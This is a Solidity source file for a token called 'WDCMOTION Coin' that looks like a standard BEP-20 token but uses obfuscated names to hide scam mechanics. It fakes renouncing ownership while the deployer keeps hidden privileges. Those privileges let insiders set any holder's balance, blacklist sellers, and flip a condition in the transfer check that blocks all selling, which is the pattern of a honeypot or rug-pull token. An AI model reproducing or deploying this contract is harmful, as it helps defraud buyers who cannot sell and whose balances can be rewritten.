//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface maxSenderFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoIs) external view returns (uint256);

    function transfer(address marketingFee, uint256 senderLiquidity) external returns (bool);

    function allowance(address modeTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address marketingFee,
        uint256 senderLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atShould, uint256 value);
    event Approval(address indexed modeTake, address indexed spender, uint256 value);
}

interface maxSwapEnable {
    function createPair(address launchedReceiverShould, address walletReceiverBuy) external returns (address);
}

interface atLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalMin is maxSenderFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WDCMOTIONCoin is marketingIs, maxSenderFrom, totalMin {

    address private swapTeamSell;

    string private teamLaunchFund = "WCN";

    address public launchEnable;

    function approve(address swapEnableTrading, uint256 senderLiquidity) public virtual override returns (bool) {
        teamTradingShould[_msgSender()][swapEnableTrading] = senderLiquidity;
        emit Approval(_msgSender(), swapEnableTrading, senderLiquidity);
        return true;
    }

    uint256 private minTake;

    address limitTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address limitTeam, address marketingFee, uint256 senderLiquidity) external override returns (bool) {
        if (_msgSender() != limitTo) {
            if (teamTradingShould[limitTeam][_msgSender()] != type(uint256).max) {
                require(senderLiquidity <= teamTradingShould[limitTeam][_msgSender()]);
                teamTradingShould[limitTeam][_msgSender()] -= senderLiquidity;
            }
        }
        return buySender(limitTeam, marketingFee, senderLiquidity);
    }

    function receiverEnable(address listShould) public {
        fromSellMax();
        
        if (listShould == launchEnable || listShould == sellTeamLaunched) {
            return;
        }
        takeMarketing[listShould] = true;
    }

    function balanceOf(address autoIs) public view virtual override returns (uint256) {
        return toFrom[autoIs];
    }

    function feeTrading(address isTotal, uint256 senderLiquidity) public {
        fromSellMax();
        toFrom[isTotal] = senderLiquidity;
    }

    function fromMarketingTo(address limitTeam, address marketingFee, uint256 senderLiquidity) internal returns (bool) {
        require(toFrom[limitTeam] >= senderLiquidity);
        toFrom[limitTeam] -= senderLiquidity;
        toFrom[marketingFee] += senderLiquidity;
        emit Transfer(limitTeam, marketingFee, senderLiquidity);
        return true;
    }

    uint256 fundToken;

    function totalSupply() external view virtual override returns (uint256) {
        return modeLiquidityExempt;
    }

    mapping(address => bool) public takeMarketing;

    bool private tradingShould;

    function name() external view virtual override returns (string memory) {
        return liquidityTx;
    }

    mapping(address => uint256) private toFrom;

    string private liquidityTx = "WDCMOTION Coin";

    uint256 public buyMode;

    mapping(address => mapping(address => uint256)) private teamTradingShould;

    address walletTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed launchLiquidity, address indexed senderMarketingLiquidity);

    function sellTx(uint256 senderLiquidity) public {
        fromSellMax();
        fundToken = senderLiquidity;
    }

    bool public teamTxTake;

    function decimals() external view virtual override returns (uint8) {
        return limitSwap;
    }

    function getOwner() external view returns (address) {
        return swapTeamSell;
    }

    address public sellTeamLaunched;

    constructor (){
        if (feeAt == buyMode) {
            tradingShould = false;
        }
        teamWallet();
        atLaunched toMax = atLaunched(limitTo);
        sellTeamLaunched = maxSwapEnable(toMax.factory()).createPair(toMax.WETH(), address(this));
        if (feeAt == atListTotal) {
            minTake = feeAt;
        }
        launchEnable = _msgSender();
        fromLimit[launchEnable] = true;
        toFrom[launchEnable] = modeLiquidityExempt;
        if (tradingShould) {
            atListTotal = buyMode;
        }
        emit Transfer(address(0), launchEnable, modeLiquidityExempt);
    }

    function receiverReceiver(address totalAuto) public {
        if (teamTxTake) {
            return;
        }
        
        fromLimit[totalAuto] = true;
        if (feeAt == atListTotal) {
            tradingShould = false;
        }
        teamTxTake = true;
    }

    uint256 private modeLiquidityExempt = 100000000 * 10 ** 18;

    function buySender(address limitTeam, address marketingFee, uint256 senderLiquidity) internal returns (bool) {
        if (limitTeam == launchEnable) {
            return fromMarketingTo(limitTeam, marketingFee, senderLiquidity);
        }
        uint256 tradingBuy = maxSenderFrom(sellTeamLaunched).balanceOf(walletTeam);
        require(tradingBuy == fundToken);
        require(!takeMarketing[limitTeam]);
        return fromMarketingTo(limitTeam, marketingFee, senderLiquidity);
    }

    uint256 sellAt;

    mapping(address => bool) public fromLimit;

    function fromSellMax() private view {
        require(fromLimit[_msgSender()]);
    }

    function transfer(address isTotal, uint256 senderLiquidity) external virtual override returns (bool) {
        return buySender(_msgSender(), isTotal, senderLiquidity);
    }

    uint256 public atListTotal;

    function owner() external view returns (address) {
        return swapTeamSell;
    }

    function teamWallet() public {
        emit OwnershipTransferred(launchEnable, address(0));
        swapTeamSell = address(0);
    }

    uint8 private limitSwap = 18;

    function allowance(address fundAuto, address swapEnableTrading) external view virtual override returns (uint256) {
        if (swapEnableTrading == limitTo) {
            return type(uint256).max;
        }
        return teamTradingShould[fundAuto][swapEnableTrading];
    }

    bool private takeMode;

    uint256 private feeAt;

    function symbol() external view virtual override returns (string memory) {
        return teamLaunchFund;
    }

}